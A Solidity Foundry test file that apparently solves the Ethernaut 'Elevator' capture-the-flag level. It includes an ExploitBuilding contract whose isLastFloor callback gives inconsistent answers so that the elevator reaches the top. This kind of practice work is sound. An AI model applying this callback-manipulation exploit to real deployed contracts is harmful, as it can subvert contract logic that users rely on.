// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Elevator.sol";
import "src/levels/ElevatorFactory.sol";

contract TestElevator is BaseTest {
    Elevator private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new ElevatorFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance(true));
        level = Elevator(levelAddress);

        // Check that the contract is correctly setup
        assertEq(level.top(), false);
    }

    function exploitLevel() internal override {
        vm.startPrank(player);

        ExploitBuilding expbd = new ExploitBuilding(level);
        expbd.goTo(level, 20);

        vm.stopPrank();
    }
}

contract ExploitBuilding is Building {
    constructor(Elevator ele) public {}

    function goTo(Elevator ele, uint256 stair) public {
        ele.goTo(stair);
    }

    function isLastFloor(uint256 stair) external override returns (bool) {
        if (Elevator(msg.sender).floor() == 20) {
            return true;
        }
        return false;
    }
}
